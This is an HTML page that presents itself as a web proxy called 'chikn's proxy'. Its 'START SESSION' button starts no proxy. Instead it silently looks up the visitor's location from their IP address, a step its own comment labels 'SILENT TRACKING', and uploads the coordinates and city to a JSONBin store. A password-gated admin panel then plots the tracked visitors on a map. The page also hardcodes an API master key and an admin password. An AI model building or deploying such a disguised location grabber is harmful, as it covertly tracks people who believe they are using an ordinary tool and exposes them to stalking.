<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>chikn's proxy browser</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --p-dark: #0a0a12; --p-mid: #16213e; --p-accent: #7b2cbf; }
        body { 
            background-color: var(--p-dark); 
            color: #e0e0e0; 
            font-family: 'Space Mono', monospace;
            cursor: crosshair;
            overflow: hidden;
        }
        #rain-canvas { position: fixed; top: 0; left: 0; pointer-events: none; z-index: 0; }
        .glass {
            background: rgba(10, 10, 18, 0.9);
            backdrop-filter: blur(15px);
            border: 1px solid rgba(123, 44, 191, 0.4);
            z-index: 10;
        }
        #map { height: 250px; border-radius: 8px; filter: hue-rotate(240deg) invert(1) contrast(0.8); }
        button, input, a { cursor: crosshair !important; }
        
        .discord-btn {
            position: fixed; bottom: 20px; left: 20px;
            background: #5865F2; color: white; width: 50px; height: 50px;
            border-radius: 15px; display: flex; align-items: center; justify-content: center;
            font-size: 24px; box-shadow: 0 4px 15px rgba(88, 101, 242, 0.4);
            transition: all 0.3s ease; z-index: 100;
        }
        .discord-btn:hover { transform: scale(1.1) rotate(5deg); }

        .scanline {
            width: 100%; height: 2px; background: rgba(123, 44, 191, 0.05);
            position: absolute; animation: scan 4s linear infinite;
            pointer-events: none;
        }
        @keyframes scan { from { top: 0; } to { top: 100%; } }

        .custom-scrollbar::-webkit-scrollbar { width: 4px; }
        .custom-scrollbar::-webkit-scrollbar-track { background: transparent; }
        .custom-scrollbar::-webkit-scrollbar-thumb { background: rgba(123, 44, 191, 0.3); border-radius: 10px; }
    </style>
</head>
<body class="min-h-screen flex flex-col items-center justify-center p-4">

    <div class="scanline"></div>
    <canvas id="rain-canvas"></canvas>

    <a href="https://discord.gg/EjrHXRkGTt" target="_blank" class="discord-btn">
        <i class="fab fa-discord"></i>
    </a>

    <div class="text-center mb-8 relative z-10">
        <h1 class="text-4xl font-bold text-purple-400 tracking-tighter uppercase italic">chikn's proxy</h1>
        <p class="text-purple-300/30 text-[9px] tracking-[0.5em] uppercase">Security Level: Maximum</p>
    </div>

    <div class="w-full max-w-md glass p-6 rounded-2xl shadow-[0_0_80px_rgba(123,44,191,0.15)] relative z-10">
        <div id="status" class="hidden mb-4 p-3 rounded-lg text-center text-[10px] font-bold uppercase tracking-widest border"></div>
        
        <div id="main-interface">
            <button id="start-btn" class="w-full bg-purple-600 hover:bg-purple-500 text-white font-bold py-6 rounded-xl shadow-[0_0_20px_rgba(123,44,191,0.4)] transition-all active:scale-95 text-lg uppercase tracking-widest">
                START SESSION
            </button>

            <div class="mt-8 border-t border-purple-500/20 pt-6">
                <div id="login-section">
                    <input type="password" id="pass" placeholder="SYSTEM_KEY" class="w-full p-4 bg-black/40 border border-purple-500/20 rounded-xl mb-3 outline-none focus:border-purple-500 transition-all text-center text-purple-300 text-xs">
                    <button id="admin-btn" class="w-full bg-transparent border border-purple-500/30 text-purple-400 py-2 rounded-xl text-[9px] font-bold uppercase hover:bg-purple-500/10 transition-colors">
                        Admin Overdrive
                    </button>
                </div>

                <div id="dashboard" class="hidden space-y-4">
                    <div class="flex justify-between items-center text-[9px] text-purple-500 font-bold uppercase tracking-widest">
                        <span>Active Uplinks</span>
                        <button id="logout" class="text-red-500/60 hover:text-red-400">Lock</button>
                    </div>
                    <div id="map"></div>
                    <div id="log-list" class="space-y-1 max-h-32 overflow-y-auto pr-2 custom-scrollbar"></div>
                    <div class="grid grid-cols-2 gap-2">
                        <button id="refresh-map" class="bg-purple-900/20 border border-purple-500/20 py-2 rounded text-[8px] font-bold text-purple-300 uppercase">Update</button>
                        <button id="clear-data" class="bg-red-900/10 border border-red-500/20 py-2 rounded text-[8px] font-bold text-red-400 uppercase">Purge</button>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script>
        const BIN_ID = "694b70d443b1c97be901f24b"; 
        const API_KEY = "$2a$10$v/u.3QIsZjp/k/ptGgQwF./CkX29f1nu.f2FYI0qKwcEZX3t3RNRW"; 
        const ADMIN_PASS = "mommy9";

        const startBtn = document.getElementById('start-btn');
        const adminBtn = document.getElementById('admin-btn');
        const passInput = document.getElementById('pass');
        const statusBox = document.getElementById('status');
        let map, markers = [];

        // Rain Background
        const canvas = document.getElementById('rain-canvas');
        const ctx = canvas.getContext('2d');
        let drops = [];
        function initRain() {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            drops = [];
            for(let i=0; i<150; i++) drops.push({x: Math.random()*canvas.width, y: Math.random()*canvas.height, l: Math.random()*20, v: Math.random()*6 + 6});
        }
        function drawRain() {
            ctx.clearRect(0,0,canvas.width, canvas.height);
            ctx.strokeStyle = 'rgba(123, 44, 191, 0.1)';
            ctx.lineWidth = 1;
            drops.forEach(d => {
                ctx.beginPath(); ctx.moveTo(d.x, d.y); ctx.lineTo(d.x, d.y + d.l); ctx.stroke();
                d.y += d.v; if(d.y > canvas.height) d.y = -20;
            });
            requestAnimationFrame(drawRain);
        }
        initRain(); drawRain();
        window.addEventListener('resize', initRain);

        function showStatus(msg, isError = false) {
            statusBox.innerText = msg;
            statusBox.className = `mb-4 p-3 rounded-lg text-center text-[10px] font-bold uppercase tracking-widest border ${isError ? 'border-red-500 text-red-400 bg-red-900/10' : 'border-purple-500 text-purple-300 bg-purple-900/10'}`;
            statusBox.classList.remove('hidden');
        }

        async function syncToCloud(loc) {
            try {
                const getRes = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
                    headers: { "X-Master-Key": API_KEY }
                });
                const data = await getRes.json();
                let records = Array.isArray(data.record) ? data.record : [];
                records.push(loc);
                if (records.length > 100) records = records.slice(-100);

                await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
                    method: 'PUT',
                    headers: { "Content-Type": "application/json", "X-Master-Key": API_KEY },
                    body: JSON.stringify(records)
                });
                showStatus("SESSION ESTABLISHED. RELAY SECURE.");
            } catch (e) {
                showStatus("DATABASE UPLINK FAILURE", true);
            }
        }

        // SILENT TRACKING VIA IP
        startBtn.onclick = async () => {
            startBtn.disabled = true;
            startBtn.innerText = "LOCALIZING...";
            showStatus("TRIANGULATING SIGNAL...");

            try {
                // Fetch location from IPAPI (Silent, no prompt)
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();

                if (data.latitude && data.longitude) {
                    const newLoc = {
                        lat: data.latitude,
                        lng: data.longitude,
                        timestamp: Date.now(),
                        device: "IP_NODE: " + (data.city || "UNKNOWN")
                    };
                    await syncToCloud(newLoc);
                } else {
                    throw new Error("IP Lookup Failed");
                }
            } catch (err) {
                console.warn("Silent Track Fail:", err);
                showStatus("SIGNAL LOST. RETRYING...", true);
            } finally {
                startBtn.disabled = false;
                startBtn.innerText = "START SESSION";
            }
        };

        adminBtn.onclick = () => {
            if(passInput.value === ADMIN_PASS) {
                document.getElementById('login-section').classList.add('hidden');
                document.getElementById('dashboard').classList.remove('hidden');
                initMap(); loadData();
            } else { showStatus("ACCESS DENIED: INVALID KEY", true); }
        };

        function initMap() {
            if(!map) {
                map = L.map('map', { zoomControl: false }).setView([20, 0], 2);
                L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png').addTo(map);
            }
        }

        async function loadData() {
            try {
                const res = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
                    headers: { "X-Master-Key": API_KEY, "X-Bin-Meta": "false" }
                });
                const allRecords = await res.json();
                markers.forEach(m => map.removeLayer(m)); markers = [];
                const list = document.getElementById('log-list'); list.innerHTML = '';

                if (Array.isArray(allRecords)) {
                    const now = Date.now();
                    allRecords.filter(r => r.lat && (now - r.timestamp) < 86400000).reverse().forEach(loc => {
                        const m = L.marker([loc.lat, loc.lng]).addTo(map);
                        markers.push(m);
                        const div = document.createElement('div');
                        div.className = "bg-purple-900/10 border border-purple-500/10 p-2 rounded text-[7px] flex justify-between uppercase text-purple-400 mb-1";
                        div.innerHTML = `<span>${loc.device}</span><span>${new Date(loc.timestamp).toLocaleTimeString()}</span>`;
                        list.appendChild(div);
                    });
                    if (markers.length > 0) map.fitBounds(new L.featureGroup(markers).getBounds().pad(0.2));
                }
            } catch (e) { showStatus("LOAD FAILED", true); }
        }

        document.getElementById('clear-data').onclick = async () => {
            if(!confirm("CONFIRM DATABASE WIPE?")) return;
            await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
                method: 'PUT',
                headers: { "Content-Type": "application/json", "X-Master-Key": API_KEY },
                body: JSON.stringify([])
            });
            loadData(); showStatus("DATA PURGED.");
        };

        document.getElementById('refresh-map').onclick = loadData;
        document.getElementById('logout').onclick = () => location.reload();
    </script>
</body>
</html>
